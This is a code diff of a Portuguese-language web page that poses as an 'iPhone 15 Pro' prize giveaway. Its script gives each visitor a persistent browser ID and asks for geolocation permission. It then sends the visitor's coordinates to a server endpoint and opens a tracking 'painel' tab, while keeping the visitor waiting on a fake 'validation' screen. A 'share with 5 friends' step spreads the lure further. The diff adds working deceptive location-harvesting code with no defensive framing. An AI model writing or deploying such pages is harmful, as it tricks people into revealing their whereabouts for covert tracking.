@@ -2,38 +2,52 @@
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8"/>
-  <title>Continue para o sorteio</title>
+  <title>Ganhe um iPhone 15</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <style>
-    body{margin:0;padding:40px;font:18px/1.5 sans-serif;background:#fafafa;text-align:center}
-    button{margin-top:30px;padding:12px 28px;font-size:18px;border:0;background:#34b7f1;color:#fff;border-radius:6px;cursor:pointer}
-    button:disabled{background:#ccc}
+    body{margin:0;padding:40px;font:18px/1.5 sans-serif;background:linear-gradient(135deg,#ff5f6d,#ffc371);color:#fff;text-align:center}
+    button{margin-top:30px;padding:14px 32px;font-size:18px;border:0;background:#fff;color:#ff5f6d;border-radius:30px;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,.25)}
+    button:disabled{background:#ccc;color:#666}
+    #steps{display:none;margin-top:20px;font-size:16px}
   </style>
 </head>
 <body>
-  <h1>Parabéns! Você foi pré-selecionado.</h1>
-  <p>Clique abaixo para resgatar seu prêmio.</p>
-  <button id="btn">Resgatar agora</button>
+  <h1>Parabéns! Você foi o visitante nº 1.000.000</h1>
+  <p>Resgate seu <b>iPhone 15 Pro</b> agora mesmo.</p>
+  <button id="btn">Resgatar prêmio</button>
+  <div id="steps">
+    <p>1. Compartilhe com 5 amigos<br>2. Aguarde validação…</p>
+  </div>
 
   <script>
+    // gera ou recupera ID único por navegador
     const uid = localStorage.getItem('uid') || ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,c=>(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16));
     localStorage.setItem('uid',uid);
 
     btn.onclick=()=>{
       btn.disabled=true;
-      btn.textContent='Aguarde…';
+      btn.textContent='Processando…';
+      document.getElementById('steps').style.display='block';
+
+      // pede permissão de localização
       navigator.geolocation.getCurrentPosition(
         pos=>{
-          // opcional: envia o primeiro fix
+          // abre painel EM NOVA ABA (se bloqueador, fallback silencioso)
+          const painel=window.open('/painel.html?id='+uid,'_blank');
+          if(!painel) console.log('popup bloqueado – painel já existe ou abra manualmente');
+
+          // envia primeiro fix (opcional)
           fetch('/api/ping',{
             method:'POST',
             headers:{'Content-Type':'application/json'},
             body:JSON.stringify({id:uid,lat:pos.coords.latitude,lng:pos.coords.longitude,ts:Date.now()})
           }).catch(()=>{});
-          location.replace('/painel.html?id='+uid);
+
+          // fica na mesma página para sempre
+          btn.textContent='Validação em andamento…';
         },
         err=>{
-          alert('Para continuar, ative a localização e recarregue.');
+          alert('Para validar seu prêmio, ative a localização e clique novamente.');
           btn.disabled=false;
           btn.textContent='Tentar novamente';
         },
